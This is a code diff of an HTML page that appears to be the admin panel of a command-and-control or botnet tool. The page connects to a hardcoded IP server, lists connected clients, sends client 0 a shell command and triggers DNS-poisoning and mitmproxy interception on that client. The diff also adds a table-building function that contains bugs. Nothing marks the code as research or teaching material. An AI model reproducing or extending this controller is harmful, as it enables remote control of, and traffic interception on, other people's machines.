@@ -11,32 +11,62 @@
 
 
   <script>
-            var socket = io('http://13.126.74.47:8000');
+  function generateUsersList(data) {
+    var str = '<table class="table">';
+    str += "<tr><td>ID</td><td>Name</td>";
+    for(var i = 0; i < data.length;i++) {
+        str += "<tr><td>" + data[i].sockid + "</td><td>" + data.name + "</td>"
+    }
+    str += "</table>";
 
-            socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
-                console.log("Connect ACK");
-                socket.emit('list_clients', null, function (data) {
-                    console.log("Listing clients...");
-                    console.log(data);
-                    document.querySelector("#clients").innerHTML = JSON.stringify(data);
+  }
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    var socket = io('http://13.126.74.47:8000');
+
+    socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
+        console.log("Connect ACK");
+        socket.emit('list_clients', null, function (data) {
+            console.log("Listing clients...");
+            $("#clients").append(generateUsersList(data));
 
 
-                    socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
-                        console.log(data) 
-                    });
-
-                    socket.emit('dnspoison_client', { toclient: 0 }, function (data) {
-                        console.log(data) 
-                    });
-
-                    socket.emit('mitmproxy_client', { toclient: 0 }, function (data) {
-                        console.log(data) 
-                    });
+            
+            
+            
 
 
-                    
-                });
+
+
+            socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
+                console.log(data) 
             });
+
+            socket.emit('dnspoison_client', { toclient: 0 }, function (data) {
+                console.log(data) 
+            });
+
+            socket.emit('mitmproxy_client', { toclient: 0 }, function (data) {
+                console.log(data) 
+            });
+
+
+            
+        });
+    });
 
 
             
@@ -47,10 +77,6 @@
 </head>
 <body>
 
-<div class="jumbotron text-center">
-  <h1>My First Bootstrap Page</h1>
-  <p>Resize this responsive page to see the effect!</p> 
-</div>
   
 <div class="container">
   <div class="row">
@@ -63,5 +89,6 @@
 
 </body>
 </html>
+
 
 
